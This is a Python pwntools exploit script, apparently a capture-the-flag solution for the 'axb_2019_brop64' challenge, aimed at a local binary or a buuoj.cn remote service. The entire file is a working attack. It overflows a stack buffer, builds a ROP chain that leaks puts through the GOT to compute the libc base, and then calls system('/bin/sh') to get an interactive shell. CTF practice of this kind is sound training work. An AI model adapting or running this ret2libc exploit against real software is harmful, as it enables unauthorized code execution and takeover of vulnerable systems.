import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./axb_2019_brop64')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./axb_2019_brop64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26693)
			elf=ELF('./axb_2019_brop64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')


		pop_rdi=0x0000000000400963
		start=0x4006e0
		io.recv()
		pay='a'*0xd8+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(start)
		io.sendline(pay)
		libc_base=u64(io.recv()[0xe4:0xe4+6]+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		pay='a'*0xd8+p64(pop_rdi)+p64(libc.search('/bin/sh\x00').next())+p64(libc.sym['system'])+p64(start)
		io.sendline(pay)
		io.recv()





		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue